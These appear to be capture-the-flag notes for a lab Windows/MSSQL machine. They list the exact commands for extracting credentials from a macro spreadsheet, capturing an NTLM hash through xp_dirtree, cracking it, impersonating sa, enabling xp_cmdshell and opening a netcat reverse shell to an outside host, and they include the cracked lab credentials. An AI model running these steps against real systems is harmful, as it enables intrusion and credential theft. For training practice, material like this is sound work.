#### ++ STEPS ++
-> We found a `.xlsm` (Excel) file in SMB and we extract some credentials (`reporting:PcwTWTHRwryjc$c6`) with `olevba` (`olevba "Currency Volume Report.xlsm"`)
-> With found credentials we can open mssql service and get user hash:
	`impacket-mssqlclient -p 1433 reporting:'PcwTWTHRwryjc$c6'@10.129.47.41 -windows-auth` (Connect)
	`SQL> EXEC master..xp_dirtree '\\10.10.14.55\share\'` (Catch the hash with `responder` or `smbserver`)
-> Crack the hash with john (`mssql-svc:corporate568`) and connect to user with more privileges
	`impacket-mssqlclient -p 1433 mssql-svc:'corporate568'@10.129.47.41 -windows-auth`
-> Check privileges to impersonate
	`SQL> SELECT * FROM fn_my_permissions(NULL, 'SERVER');`
-> Query sysadmin users
	`SQL> SELECT SYSTEM_USER`  
	`SQL> SELECT IS_SRVROLEMEMBER('sysadmin')`
-> Execute commands as sysadmin
	`SQL> EXECUTE AS LOGIN = 'sa'`
-> Enable `xp_cmdshell`
	`SQL> EXECUTE sp_configure 'show advanced options', 1`
	`SQL> RECONFIGURE`
	`SQL> EXECUTE sp_configure 'xp_cmdshell', 1`
	`SQL> RECONFIGURE`
-> Execute commands in server and get a shell
	`SQL> xp_cmdshell \\10.10.14.55\share\nc.exe -e cmd.exe 10.10.14.55 9001`
#### ++ USERS ++
	reporting
	mssql-svc

#### ++ CREDENTIALS ++
	reporting : PcwTWTHRwryjc$c6
	mssql-svc : corporate568
	
#### ++ Sensitive info in SMB share (null session) ++
	We can retrieve a xlsm file with valid credentials in Reports share

#### ++ Priv Esc ++
	Path and steps